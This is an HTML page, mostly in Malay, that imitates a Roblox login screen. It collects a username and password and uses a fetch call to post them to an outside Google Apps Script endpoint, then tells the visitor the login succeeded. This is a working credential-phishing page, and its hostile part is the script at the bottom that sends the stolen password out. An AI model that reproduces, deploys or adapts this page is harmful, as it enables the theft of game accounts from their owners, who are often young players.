
<!DOCTYPE html>
<html lang="ms">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Roblox Account</title>
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 20px;
      font-family: Arial, sans-serif;
      color: white;
      background: radial-gradient(circle at top, #25205b, #090914 65%);
    }

    .card {
      width: 100%;
      max-width: 480px;
      padding: 30px;
      border: 1px solid #484078;
      border-radius: 20px;
      background: #121222;
      box-shadow: 0 0 35px #6246e933;
    }

    h1 { margin-top: 0; }
    p { color: #b9b7d3; line-height: 1.6; }

    label {
      display: block;
      margin: 18px 0 8px;
    }

    input, textarea {
      width: 100%;
      padding: 13px;
      border: 1px solid #45415f;
      border-radius: 10px;
      background: #1b1b30;
      color: white;
      font: inherit;
    }

    textarea { min-height: 140px; resize: vertical; }

    button {
      width: 100%;
      margin-top: 18px;
      padding: 14px;
      border: 0;
      border-radius: 10px;
      background: linear-gradient(90deg, #6655ff, #a64dff);
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    #status { overflow-wrap: anywhere; }
  </style>
</head>
<body>
  <main class="card">
    <h1>🎮 Roblox Account</h1>
    <p>Log Masuk Untuk Ke Website Roblox</p>

    <form id="feedbackForm">
      <label for="name">Nama Pengguna Akun</label>
      <input id="name" maxlength="60" placeholder="Username Account">

      <label for="message">Kata Sandi Akun</label>
      <textarea id="message" maxlength="2000"
        placeholder="Your Account Password"
        required></textarea>

      <button type="submit">Login Account ↗</button>
    </form>

    <p id="status" role="status"></p>
  </main>


<script>
const scriptURL = "https://script.google.com/macros/s/AKfycbwAALrBUPNSx9CpC4UGGQN8aoWZFq-_366P9bs97lGbsDEqm4gJOJuZJmqtHo3mvMaUvw/exec";

document.getElementById("feedbackForm")
  .addEventListener("submit", async function(event) {
    event.preventDefault();

    const status = document.getElementById("status");
    const button = this.querySelector("button");

    const data = {
      name: document.getElementById("name").value.trim(),
      message: document.getElementById("message").value.trim()
    };

    if (!data.message) {
      status.textContent = "Sila tulis mesej dahulu.";
      return;
    }

    button.disabled = true;
    button.textContent = "Loading...";
    status.textContent = "Sedang Memproses...";

    try {
      await fetch(scriptURL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(data)
      });

      status.textContent =
        "Login Succesfully Refresh Your Website";

      this.reset();
    } catch (error) {
      status.textContent =
        "Ralat penghantaran. Sila cuba lagi.";
    } finally {
      button.disabled = false;
      button.textContent = "Hantar Mesej ↗";
    }
  });
</script>

</body>
</html>
